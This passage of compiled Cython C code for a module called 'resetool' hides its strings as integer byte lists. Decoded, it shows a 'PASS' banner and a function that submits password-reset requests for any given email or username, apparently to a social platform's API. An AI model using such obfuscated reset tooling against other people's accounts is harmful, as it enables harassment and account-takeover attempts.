  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_82);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_113);
  __Pyx_GIVEREF(__pyx_int_113);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_113);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_116);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_headers, __pyx_t_1) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.resetool.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_8resetool_3banner(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_8resetool_3banner = {"banner", (PyCFunction)__pyx_pw_6source_8resetool_3banner, METH_O, 0};
static PyObject *__pyx_pw_6source_8resetool_3banner(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("banner (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8resetool_2banner(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8resetool_2banner(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_textt = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  Py_UCS4 __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("banner", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_render); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_65);
  __Pyx_GIVEREF(__pyx_int_65);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_65);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_83);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_83);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
  __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_4, 0, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_4, 1, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_4, 2, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_4, 3, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_107);
  __Pyx_GIVEREF(__pyx_int_107);
  PyList_SET_ITEM(__pyx_t_4, 4, __pyx_int_107);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = PyList_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_5, 0, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_5, 1, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_5, 2, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_5, 3, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_107);
  __Pyx_GIVEREF(__pyx_int_107);
  PyList_SET_ITEM(__pyx_t_5, 4, __pyx_int_107);
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_decode_bytes(__pyx_t_6, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = PyList_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_4);
  PyList_SET_ITEM(__pyx_t_6, 0, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_5);
  PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_5);
  __pyx_t_4 = 0;
  __pyx_t_5 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_colors, __pyx_t_6) < 0) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = PyList_New(6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_6, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_6, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_6, 3, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_6, 4, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_6, 5, __pyx_int_114);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_align, __pyx_t_6) < 0) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = PyList_New(6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_6, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_6, 2, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_6, 3, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_6, 4, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_6, 5, __pyx_int_119);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_background, __pyx_t_6) < 0) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_textt = __pyx_t_6;
  __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_textt); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = 0;
  __pyx_t_8 = 127;
  __Pyx_INCREF(__pyx_n_u_);
  __pyx_t_8 = (65535 > __pyx_t_8) ? 65535 : __pyx_t_8;
  __pyx_t_7 += 10;
  __Pyx_GIVEREF(__pyx_n_u_);
  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_n_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_LightYellow); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__2);
  __pyx_t_8 = (1114111 > __pyx_t_8) ? 1114111 : __pyx_t_8;
  __pyx_t_7 += 37;
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u__2);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.resetool.banner", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_textt);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_8resetool_5resetdvmb(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_8resetool_5resetdvmb = {"resetdvmb", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_8resetool_5resetdvmb, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_8resetool_5resetdvmb(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_email = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("resetdvmb (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_email,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_email)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("resetdvmb", 1, 2, 2, 1); __PYX_ERR(0, 64, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "resetdvmb") < 0)) __PYX_ERR(0, 64, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_self = values[0];
    __pyx_v_email = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("resetdvmb", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 64, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.resetool.resetdvmb", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_8resetool_4resetdvmb(__pyx_self, __pyx_v_self, __pyx_v_email);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8resetool_4resetdvmb(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_json_resp = NULL;
  PyObject *__pyx_v_status_text = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  Py_ssize_t __pyx_t_9;
  Py_UCS4 __pyx_t_10;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  char const *__pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("resetdvmb", 0);

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(17); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_101);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_v_email) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_119);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_102);
  __Pyx_GIVEREF(__pyx_int_102);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_102);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_108);
